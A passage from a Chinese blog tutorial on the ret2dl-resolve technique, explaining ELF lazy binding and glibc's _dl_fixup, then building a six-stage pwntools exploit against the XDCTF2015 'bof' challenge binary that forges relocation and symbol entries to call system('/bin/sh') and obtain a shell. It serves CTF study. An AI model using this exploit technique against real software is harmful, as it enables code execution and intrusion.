<h3 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h3><p>程序在执行的过程中，可能引入的有些C库函数到结束时都不会执行。所以ELF采用延迟绑定的技术，在第一次调用C库函数是时才会去寻找真正的位置进行绑定。<br>具体来说，在前一部分我们已经知道，当程序执行call write@plt时，实际会跳到0x0804a01c去执行。而0x0804a01c处的汇编代码仅仅三行。我们来看一下这三行代码做了什么。<br>第一行：前面提到过0x0804a01c是write的GOT表位置，当我们第一次调用write时，其对应的GOT表里并没有存放write的真实地址，而是write@plt的下一条指令地址。<img src="/images/ret2dlresolve/write_got1.png"><br>第二、三行：把reloc_arg=0x20作为参数推入栈中，跳到0x08048380（PLT[0]）继续执行。<br><img src="/images/ret2dlresolve/got1.png"><br>0x08048380（PLT[0]）再把<code>link_map=*(GOT+4)</code>（即GOT[1]，链接器的标识信息）作为参数推入栈中，而<code>*(GOT+8)</code>（即GOT[2]，动态链接器中的入口点）中保存的是<code>_dl_runtime_resolve</code>函数的地址。因此以上指令相当于执行了<code>_dl_runtime_resolve(link_map, reloc_arg)</code>，该函数会完成符号的解析，即将真实的write函数地址写入其GOT条目中，随后把控制权交给write函数。<br>_dl_runtime_resolve是在glibc-2.23/sysdeps/i386/dl-trampoline.S中用汇编实现的。0xf7fededb处即调用<code>_dl_fixup</code>，并且通过寄存器传参。<br><img src="/images/ret2dlresolve/dl_runtime.png"><br>_dl_fixup是在glibc-2.23/elf/dl-runtime.c实现的，我们只关注一些主要函数。  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">_dl_fixup(struct link_map *l, ElfW(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 首先通过参数reloc_arg计算重定位入口，这里的JMPREL即.rel.plt，reloc_offset即reloc_arg</span></span><br><span class="line">    <span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">    <span class="comment">// 然后通过reloc-&gt;r_info找到.dynsym中对应的条目</span></span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">    <span class="comment">// 这里还会检查reloc-&gt;r_info的最低位是不是R_386_JUMP_SLOT=7</span></span><br><span class="line">    assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line">    <span class="comment">// 接着通过strtab+sym-&gt;st_name找到符号表字符串，result为libc基地址</span></span><br><span class="line">    result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope, version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">// value为libc基址加上要解析函数的偏移地址，也即实际地址</span></span><br><span class="line">    value = DL_FIXUP_MAKE_VALUE (result, sym ? (LOOKUP_VALUE_ADDRESS (result) + sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// 最后把value写入相应的GOT表条目中</span></span><br><span class="line">    <span class="keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="漏洞利用方式"><a href="#漏洞利用方式" class="headerlink" title="漏洞利用方式"></a>漏洞利用方式</h2><p>1.控制<code>eip</code>为PLT[0]的地址，只需传递一个<code>index_arg</code>参数<br>2.控制<code>index_arg</code>的大小，使<code>reloc</code>的位置落在可控地址内<br>3.伪造<code>reloc</code>的内容，使<code>sym</code>落在可控地址内<br>4.伪造<code>sym</code>的内容，使<code>name</code>落在可控地址内<br>5.伪造<code>name</code>为任意库函数，如<code>system</code><br><strong>控制eip</strong><br>首先确认一下进程当前开了哪些保护<br><img src="/images/ret2dlresolve/checksec.png"><br>由于程序存在栈缓冲区漏洞，我们可以用peda很快定位覆写eip的位置<br><img src="/images/ret2dlresolve/patterncreate.png"><br><strong>stage1</strong><br>我们先写一个ROP链，直到返回到<code>write@plt</code>  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&#x27;bof&#x27;</span>)</span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line">ppp_ret = <span class="number">0x08048619</span> <span class="comment"># ROPgadget --binary bof --only &quot;pop|ret&quot;</span></span><br><span class="line">pop_ebp_ret = <span class="number">0x0804861b</span></span><br><span class="line">leave_ret = <span class="number">0x08048458</span> <span class="comment"># ROPgadget --binary bof --only &quot;leave|ret&quot;</span></span><br><span class="line"></span><br><span class="line">stack_size = <span class="number">0x800</span></span><br><span class="line">bss_addr = <span class="number">0x0804a040</span> <span class="comment"># readelf -S bof | grep &quot;.bss&quot;</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./bof&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;Welcome to XDCTF2015~!\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * offset</span><br><span class="line">payload += p32(read_plt) <span class="comment"># 读100个字节到base_stage</span></span><br><span class="line">payload += p32(ppp_ret)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(<span class="number">100</span>)</span><br><span class="line">payload += p32(pop_ebp_ret) <span class="comment"># 把base_stage pop到ebp中</span></span><br><span class="line">payload += p32(base_stage)</span><br><span class="line">payload += p32(leave_ret) <span class="comment"># mov esp, ebp ; pop ebp ;将esp指向base_stage</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;AAAA&#x27;</span> <span class="comment"># 接上一个payload的leave-&gt;pop ebp ; ret</span></span><br><span class="line">payload2 += p32(write_plt)</span><br><span class="line">payload2 += <span class="string">&#x27;AAAA&#x27;</span></span><br><span class="line">payload2 += p32(<span class="number">1</span>)</span><br><span class="line">payload2 += p32(base_stage + <span class="number">80</span>)</span><br><span class="line">payload2 += p32(<span class="built_in">len</span>(cmd))</span><br><span class="line">payload2 += <span class="string">&#x27;A&#x27;</span> * (<span class="number">80</span> - <span class="built_in">len</span>(payload2))</span><br><span class="line">payload2 += cmd + <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">payload2 += <span class="string">&#x27;A&#x27;</span> * (<span class="number">100</span> - <span class="built_in">len</span>(payload2))</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p>最后会把输入的cmd打印出来  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ .&#x2F;stage1.py</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;fanrong&#x2F;Computer&#x2F;PWN&#x2F;basics&#x2F;ret2dl-resolve&#x2F;bof&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE</span><br><span class="line">[+] Starting local process &#39;.&#x2F;bof&#39;: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>
<p><strong>stage2</strong><br>这次控制<code>eip</code>返回<code>PLT[0]</code>，要带上write的<code>index_offset</code>。这里修改一下payload2  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">cmd = <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">plt_0 = <span class="number">0x08048380</span> <span class="comment"># objdump -d -j .plt bof</span></span><br><span class="line">index_offset = <span class="number">0x20</span> <span class="comment"># write&#x27;s index</span></span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;AAAA&#x27;</span></span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += <span class="string">&#x27;AAAA&#x27;</span></span><br><span class="line">payload2 += p32(<span class="number">1</span>)</span><br><span class="line">payload2 += p32(base_stage + <span class="number">80</span>)</span><br><span class="line">payload2 += p32(<span class="built_in">len</span>(cmd))</span><br><span class="line">payload2 += <span class="string">&#x27;A&#x27;</span> * (<span class="number">80</span> - <span class="built_in">len</span>(payload2))</span><br><span class="line">payload2 += cmd + <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">payload2 += <span class="string">&#x27;A&#x27;</span> * (<span class="number">100</span> - <span class="built_in">len</span>(payload2))</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p>同样会把输入的cmd打印出来  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ .&#x2F;stage2.py</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;fanrong&#x2F;Computer&#x2F;PWN&#x2F;basics&#x2F;ret2dl-resolve&#x2F;bof&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE</span><br><span class="line">[+] Starting local process &#39;.&#x2F;bof&#39;: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>
<p><strong>stage3</strong><br>这次控制<code>index_offset</code>，使其指向我们构造的<code>fake_reloc</code>  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">cmd = <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">plt_0 = <span class="number">0x08048380</span> <span class="comment"># objdump -d -j .plt bof</span></span><br><span class="line">rel_plt = <span class="number">0x08048330</span> <span class="comment"># objdump -s -j .rel.plt bof</span></span><br><span class="line">index_offset = (base_stage + <span class="number">28</span>) - rel_plt <span class="comment"># base_stage + 28指向fake_reloc，减去rel_plt即偏移</span></span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">r_info = <span class="number">0x607</span> <span class="comment"># write: Elf32_Rel-&gt;r_info</span></span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;AAAA&#x27;</span></span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += <span class="string">&#x27;AAAA&#x27;</span></span><br><span class="line">payload2 += p32(<span class="number">1</span>)</span><br><span class="line">payload2 += p32(base_stage + <span class="number">80</span>)</span><br><span class="line">payload2 += p32(<span class="built_in">len</span>(cmd))</span><br><span class="line">payload2 += fake_reloc <span class="comment"># (base_stage+28)的位置</span></span><br><span class="line">payload2 += <span class="string">&#x27;A&#x27;</span> * (<span class="number">80</span> - <span class="built_in">len</span>(payload2))</span><br><span class="line">payload2 += cmd + <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">payload2 += <span class="string">&#x27;A&#x27;</span> * (<span class="number">100</span> - <span class="built_in">len</span>(payload2))</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p>同样会把输入的cmd打印出来  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[*] &#39;&#x2F;home&#x2F;fanrong&#x2F;Computer&#x2F;PWN&#x2F;basics&#x2F;ret2dl-resolve&#x2F;bof&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE</span><br><span class="line">[+] Starting local process &#39;.&#x2F;bof&#39;: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>
<p><strong>stage4</strong><br>这一次构造<code>fake_sym</code>，使其指向我们控制的<code>st_name</code>  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">cmd = <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">plt_0 = <span class="number">0x08048380</span></span><br><span class="line">rel_plt = <span class="number">0x08048330</span></span><br><span class="line">index_offset = (base_stage + <span class="number">28</span>) - rel_plt</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">dynsym = <span class="number">0x080481d8</span></span><br><span class="line">dynstr = <span class="number">0x08048278</span></span><br><span class="line">fake_sym_addr = base_stage + <span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>) <span class="comment"># 这里的对齐操作是因为dynsym里的Elf32_Sym结构体都是0x10字节大小</span></span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / <span class="number">0x10</span> <span class="comment"># 除以0x10因为Elf32_Sym结构体的大小为0x10，得到write的dynsym索引号</span></span><br><span class="line">r_info = (index_dynsym &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">st_name = <span class="number">0x4c</span></span><br><span class="line">fake_sym = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;AAAA&#x27;</span></span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += <span class="string">&#x27;AAAA&#x27;</span></span><br><span class="line">payload2 += p32(<span class="number">1</span>)</span><br><span class="line">payload2 += p32(base_stage + <span class="number">80</span>)</span><br><span class="line">payload2 += p32(<span class="built_in">len</span>(cmd))</span><br><span class="line">payload2 += fake_reloc <span class="comment"># (base_stage+28)的位置</span></span><br><span class="line">payload2 += <span class="string">&#x27;B&#x27;</span> * align</span><br><span class="line">payload2 += fake_sym <span class="comment"># (base_stage+36)的位置</span></span><br><span class="line">payload2 += <span class="string">&#x27;A&#x27;</span> * (<span class="number">80</span> - <span class="built_in">len</span>(payload2))</span><br><span class="line">payload2 += cmd + <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">payload2 += <span class="string">&#x27;A&#x27;</span> * (<span class="number">100</span> - <span class="built_in">len</span>(payload2))</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p>同样会把输入的cmd打印出来  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ .&#x2F;stage4.py</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;fanrong&#x2F;Computer&#x2F;PWN&#x2F;basics&#x2F;ret2dl-resolve&#x2F;bof&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE</span><br><span class="line">[+] Starting local process &#39;.&#x2F;bof&#39;: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>
<p><strong>stage5</strong><br>把<code>st_name</code>指向输入的字符串<code>&quot;write&quot;</code>  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">cmd = <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">plt_0 = <span class="number">0x08048380</span></span><br><span class="line">rel_plt = <span class="number">0x08048330</span></span><br><span class="line">index_offset = (base_stage + <span class="number">28</span>) - rel_plt</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">dynsym = <span class="number">0x080481d8</span></span><br><span class="line">dynstr = <span class="number">0x08048278</span></span><br><span class="line">fake_sym_addr = base_stage + <span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / <span class="number">0x10</span></span><br><span class="line">r_info = (index_dynsym &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">st_name = (fake_sym_addr + <span class="number">0x10</span>) - dynstr <span class="comment"># 加0x10因为Elf32_Sym的大小为0x10</span></span><br><span class="line">fake_sym = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;AAAA&#x27;</span></span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += <span class="string">&#x27;AAAA&#x27;</span></span><br><span class="line">payload2 += p32(<span class="number">1</span>)</span><br><span class="line">payload2 += p32(base_stage + <span class="number">80</span>)</span><br><span class="line">payload2 += p32(<span class="built_in">len</span>(cmd))</span><br><span class="line">payload2 += fake_reloc <span class="comment"># (base_stage+28)的位置</span></span><br><span class="line">payload2 += <span class="string">&#x27;B&#x27;</span> * align</span><br><span class="line">payload2 += fake_sym <span class="comment"># (base_stage+36)的位置</span></span><br><span class="line">payload2 += <span class="string">&quot;write\x00&quot;</span></span><br><span class="line">payload2 += <span class="string">&#x27;A&#x27;</span> * (<span class="number">80</span> - <span class="built_in">len</span>(payload2))</span><br><span class="line">payload2 += cmd + <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">payload2 += <span class="string">&#x27;A&#x27;</span> * (<span class="number">100</span> - <span class="built_in">len</span>(payload2))</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p>打印出了输入的cmd  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ .&#x2F;stage5.py</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;fanrong&#x2F;Computer&#x2F;PWN&#x2F;basics&#x2F;ret2dl-resolve&#x2F;bof&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE</span><br><span class="line">[+] Starting local process &#39;.&#x2F;bof&#39;: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>
<p><strong>stage6</strong><br>替换<code>write</code>为<code>system</code>，并修改<code>system</code>的参数  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">cmd = <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">plt_0 = <span class="number">0x08048380</span></span><br><span class="line">rel_plt = <span class="number">0x08048330</span></span><br><span class="line">index_offset = (base_stage + <span class="number">28</span>) - rel_plt</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">dynsym = <span class="number">0x080481d8</span></span><br><span class="line">dynstr = <span class="number">0x08048278</span></span><br><span class="line">fake_sym_addr = base_stage + <span class="number">36</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr = fake_sym_addr + align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / <span class="number">0x10</span></span><br><span class="line">r_info = (index_dynsym &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">st_name = (fake_sym_addr + <span class="number">0x10</span>) - dynstr</span><br><span class="line">fake_sym = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">&#x27;AAAA&#x27;</span></span><br><span class="line">payload2 += p32(plt_0)</span><br><span class="line">payload2 += p32(index_offset)</span><br><span class="line">payload2 += <span class="string">&#x27;AAAA&#x27;</span></span><br><span class="line">payload2 += p32(base_stage + <span class="number">80</span>)</span><br><span class="line">payload2 += <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">payload2 += <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line">payload2 += fake_reloc <span class="comment"># (base_stage+28)的位置</span></span><br><span class="line">payload2 += <span class="string">&#x27;B&#x27;</span> * align</span><br><span class="line">payload2 += fake_sym <span class="comment"># (base_stage+36)的位置</span></span><br><span class="line">payload2 += <span class="string">&quot;system\x00&quot;</span></span><br><span class="line">payload2 += <span class="string">&#x27;A&#x27;</span> * (<span class="number">80</span> - <span class="built_in">len</span>(payload2))</span><br><span class="line">payload2 += cmd + <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">payload2 += <span class="string">&#x27;A&#x27;</span> * (<span class="number">100</span> - <span class="built_in">len</span>(payload2))</span><br><span class="line">r.sendline(payload2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p>得到一个shell  </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ .&#x2F;stage6.py</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;fanrong&#x2F;Computer&#x2F;PWN&#x2F;basics&#x2F;ret2dl-resolve&#x2F;bof&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE</span><br><span class="line">[+] Starting local process &#39;.&#x2F;bof&#39;: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ ls</span><br><span class="line">bof  bof.c  stage1.py  stage2.py  stage3.py  stage4.py    stage5.py  stage6.py</span><br></pre></td></tr></table></figure>
<p><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1o7QRjw2">程序和脚本下载</a><br><strong>reference</strong><br><a target="_blank" rel="noopener" href="http://drops.wooyun.org/binary/14360">http://drops.wooyun.org/binary/14360</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2016/11/09/Return-to-dl-resolve/" data-id="ckhe7o4m6003mchl7e16ubtw0" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-C-虚函数逆向分析（一）" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2016/11/02/C-%E8%99%9A%E5%87%BD%E6%95%B0%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%EF%BC%88%E4%B8%80%EF%BC%89/" class="article-date">
  <time datetime="2016-11-02T12:53:07.000Z" itemprop="datePublished">2016-11-02</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
